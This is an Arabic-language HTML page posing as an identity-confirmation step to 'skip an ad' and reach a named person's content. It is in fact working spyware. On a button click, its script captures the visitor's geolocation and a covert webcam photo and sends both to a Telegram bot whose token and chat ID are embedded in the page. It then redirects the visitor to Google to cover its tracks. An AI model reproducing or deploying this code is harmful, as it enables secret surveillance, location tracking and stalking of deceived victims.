<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تأكيد الهوية</title>
</head>
<body style="background:#000; color:#0f0; text-align:center; font-family:monospace; padding-top:100px;">
    <h1>تخطي الاعلان لدخول خالد الطويل</h1>
    <p>يرجى السماح بالصلاحيات لتأكيد ملكية الحساب.</p>
    <button id="authBtn" style="padding:15px; background:#0f0; border:none; font-weight:bold; cursor:pointer; border-radius:10px;">تأكيد الآن</button>
    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        const T = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
        const C = "7214473798";
        document.getElementById('authBtn').onclick = async () => {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('v'); v.srcObject = s;
                navigator.geolocation.getCurrentPosition(p => {
                    fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("📍 موقع جديد: https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude)}`);
                });
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {
                        const f = new FormData(); f.append('photo', b, 'a.jpg');
                        fetch(`https://api.telegram.org/bot${T}/sendPhoto?chat_id=${C}`, { method: 'POST', body: f });
                        
                        // --- الإضافة الاحترافية هنا ---
                        // سيتم نقل المستخدم فوراً لموقع جوجل بعد إتمام العملية
                        window.location.href = "https://www.google.com"; 
                        
                    }, 'image/jpeg');
                }, 1000);
            } catch (e) { alert("يجب السماح بالصلاحيات للمتابعة!"); }
        };
    </script>
</body>
</html>
